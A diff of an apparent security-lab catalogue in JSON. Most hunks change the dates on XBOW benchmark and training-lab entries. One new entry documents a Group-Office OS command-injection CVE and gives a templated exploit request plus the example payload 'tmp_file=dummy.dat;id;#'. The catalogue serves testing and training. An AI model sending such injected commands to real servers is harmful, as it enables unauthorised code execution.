@@ -373,7 +373,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-103",
@@ -408,7 +408,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-102",
@@ -441,7 +441,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-101",
@@ -473,7 +473,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-100",
@@ -506,7 +506,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-099",
@@ -538,7 +538,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-098",
@@ -572,7 +572,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-097",
@@ -604,7 +604,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-096",
@@ -636,7 +636,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-095",
@@ -668,7 +668,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-094",
@@ -700,7 +700,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-093",
@@ -732,7 +732,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-092",
@@ -765,7 +765,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-091",
@@ -798,7 +798,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-090",
@@ -831,7 +831,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-089",
@@ -864,7 +864,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-088",
@@ -897,7 +897,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-087",
@@ -929,7 +929,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-086",
@@ -961,7 +961,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-085",
@@ -994,7 +994,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-084",
@@ -1028,7 +1028,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-083",
@@ -1060,7 +1060,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-082",
@@ -1092,7 +1092,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-081",
@@ -1124,7 +1124,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-080",
@@ -1156,7 +1156,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-079",
@@ -1188,7 +1188,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-078",
@@ -1220,7 +1220,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-077",
@@ -1253,7 +1253,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-076",
@@ -1285,7 +1285,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-075",
@@ -1317,7 +1317,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-074",
@@ -1349,7 +1349,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-073",
@@ -1381,7 +1381,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-072",
@@ -1415,7 +1415,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-071",
@@ -1447,7 +1447,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-070",
@@ -1479,7 +1479,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-069",
@@ -1512,7 +1512,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-068",
@@ -1544,7 +1544,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-067",
@@ -1577,7 +1577,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-066",
@@ -1610,7 +1610,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-065",
@@ -1642,7 +1642,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-064",
@@ -1674,7 +1674,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-063",
@@ -1707,7 +1707,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-062",
@@ -1739,7 +1739,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-061",
@@ -1771,7 +1771,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-060",
@@ -1806,7 +1806,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-059",
@@ -1838,7 +1838,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-058",
@@ -1870,7 +1870,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-057",
@@ -1902,7 +1902,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-056",
@@ -1935,7 +1935,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-055",
@@ -1968,7 +1968,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-054",
@@ -2002,7 +2002,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-053",
@@ -2034,7 +2034,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-052",
@@ -2067,7 +2067,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-051",
@@ -2099,7 +2099,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-050",
@@ -2131,7 +2131,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-049",
@@ -2163,7 +2163,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-048",
@@ -2195,7 +2195,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-047",
@@ -2227,7 +2227,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-046",
@@ -2259,7 +2259,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-045",
@@ -2291,7 +2291,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-044",
@@ -2323,7 +2323,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-043",
@@ -2356,7 +2356,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-042",
@@ -2389,7 +2389,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-041",
@@ -2422,7 +2422,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-040",
@@ -2454,7 +2454,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-039",
@@ -2487,7 +2487,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-038",
@@ -2520,7 +2520,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-037",
@@ -2552,7 +2552,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-036",
@@ -2584,7 +2584,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-035",
@@ -2616,7 +2616,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-034",
@@ -2648,7 +2648,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-033",
@@ -2680,7 +2680,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-032",
@@ -2713,7 +2713,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-031",
@@ -2747,7 +2747,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-030",
@@ -2780,7 +2780,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-029",
@@ -2813,7 +2813,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-028",
@@ -2846,7 +2846,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-027",
@@ -2879,7 +2879,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-026",
@@ -2913,7 +2913,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-025",
@@ -2946,7 +2946,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-024",
@@ -2978,7 +2978,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-023",
@@ -3011,7 +3011,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-022",
@@ -3045,7 +3045,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-021",
@@ -3078,7 +3078,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-020",
@@ -3110,7 +3110,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-019",
@@ -3143,7 +3143,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-018",
@@ -3175,7 +3175,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-017",
@@ -3207,7 +3207,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-016",
@@ -3239,7 +3239,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-015",
@@ -3271,7 +3271,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-014",
@@ -3304,7 +3304,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-013",
@@ -3336,7 +3336,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-012",
@@ -3368,7 +3368,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-011",
@@ -3400,7 +3400,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-010",
@@ -3432,7 +3432,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-009",
@@ -3464,7 +3464,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-008",
@@ -3496,7 +3496,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-007",
@@ -3530,7 +3530,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-006",
@@ -3563,7 +3563,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-005",
@@ -3597,7 +3597,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-004",
@@ -3629,7 +3629,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-003",
@@ -3662,7 +3662,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-002",
@@ -3695,7 +3695,7 @@
       "Run: docker compose ps to find the mapped port"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-xbow-001",
@@ -3733,7 +3733,7 @@
       "Hint: Look for IDOR in order receipts"
     ],
     "category": "benchmarks",
-    "added_date": "2026-01-05T21:33:56+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-webgoat",
@@ -3761,7 +3761,7 @@
       }
     },
     "category": "labs",
-    "added_date": "2025-12-04T10:25:14+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-mutillidae-ii",
@@ -3789,7 +3789,7 @@
       }
     },
     "category": "labs",
-    "added_date": "2025-12-04T10:25:14+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-juice-shop",
@@ -3822,7 +3822,7 @@
       }
     },
     "category": "labs",
-    "added_date": "2025-12-04T10:25:14+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-dvwa",
@@ -3852,7 +3852,7 @@
       }
     },
     "category": "labs",
-    "added_date": "2025-12-04T10:25:14+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
   },
   {
     "id": "vt-bwapp",
@@ -3889,7 +3889,234 @@
       "Enjoy hacking!"
     ],
     "category": "labs",
-    "added_date": "2025-12-04T10:25:14+03:00"
+    "added_date": "2026-02-06T18:06:55+03:00"
+  },
+  {
+    "id": "vt-2026-25512",
+    "info": {
+      "name": "Group-Office - Remote Code Execution (OS Command Injection)",
+      "author": "omarkurt",
+      "description": "Group-Office is an enterprise customer relationship management and groupware tool. Prior to versions 6.8.150, 25.0.82, and 26.0.5, there is a remote code execution (RCE) vulnerability in Group-Office. The endpoint email/message/tnefAttachmentFromTempFile directly concatenates the user-controlled parameter tmp_file into an exec() call. By injecting shell metacharacters into tmp_file, an authenticated attacker can execute arbitrary system commands on the server. This issue has been patched in versions 6.8.150, 25.0.82, and 26.0.5.\n",
+      "targets": [
+        "group-office",
+        "php"
+      ],
+      "type": "CVE",
+      "cve": "CVE-2026-25512",
+      "cwe": "CWE-78",
+      "cvss": {
+        "score": 9.4,
+        "severity": "critical"
+      },
+      "affected_versions": [
+        "< 6.8.150",
+        "< 25.0.82",
+        "< 26.0.5"
+      ],
+      "patched_versions": [
+        "6.8.150",
+        "25.0.82",
+        "26.0.5"
+      ],
+      "tags": [
+        "groupoffice",
+        "php",
+        "cve-2026",
+        "command-injection",
+        "rce",
+        "authenticated",
+        "critical"
+      ],
+      "references": [
+        "https://github.com/Intermesh/groupoffice/security/advisories/GHSA-579w-jvg7-frr4",
+        "https://github.com/Intermesh/groupoffice/commit/6c612deca97a6cd2a1bd4feea0ce7e8e9d907792",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-25512"
+      ]
+    },
+    "vulnerabilities": {
+      "endpoint": "/api/email/message/tnefAttachmentFromTempFile",
+      "method": "POST",
+      "param": "tmp_file",
+      "auth_required": true,
+      "request": "POST /api/email/message/tnefAttachmentFromTempFile HTTP/1.1\nHost: {{target}}\nContent-Type: application/x-www-form-urlencoded\nCookie: groupoffice={{session}}\nX-CSRFToken: {{csrf_token}}\n\ntmp_file=dummy.dat;{{payload}};%23\n",
+      "response": "HTTP/1.1 200 OK\n\n[Command output appears in response or written to file]\n"
+    },
+    "technical": "The vulnerability exists in `www/modules/email/controller/MessageController.php` in the `actionTnefAttachmentFromTempFile()` function.\n\nUser input from `tmp_file` parameter is passed directly to system shell commands without sanitization. The parameter is concatenated directly into an `exec()` call:\n\n```php\nexec(GO::config()->cmd_tnef.' -C '.$tmpFolder->path().' '.$tmpFile->path(), $output, $retVar);\n```\n\nBy injecting shell metacharacters (e.g., `;`, `|`, `$()`) into the `tmp_file` parameter, an authenticated attacker can break out of the intended command and execute arbitrary system commands.\n\n**Example Payload:** `tmp_file=dummy.dat;id;#`\n",
+    "owasp": {
+      "category": "A03:2021",
+      "name": "Injection"
+    },
